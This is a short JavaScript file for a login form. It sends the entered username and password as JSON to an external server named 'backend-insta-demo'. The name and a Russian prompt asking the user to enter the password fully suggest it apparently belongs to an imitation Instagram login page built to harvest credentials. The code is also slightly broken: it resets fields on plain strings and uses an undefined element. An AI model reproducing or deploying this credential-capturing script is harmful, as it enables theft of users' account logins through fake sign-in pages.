let btn = document.querySelector(".btn");
let inp = document.querySelectorAll(".form-control");

btn.onclick = () => {
    let inp1 = inp[0].value;
    let inp2 = inp[1].value;


    fetch('https://backend-insta-demo.onrender.com/data', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            login: inp1,
            password: inp2
        })
    })
        .then(res => {
            if (res.status === 201) {
                inp1.value = ''
                inp2.value = ''
            } else {
                alert('xatolik yuzaga keldi')
            }
        })

        .catch(er => {
            mistake.textContent = `
            Пожалуйста, введите свой пароль и войдите в систему полностью
            `
            alert('error')
        })
}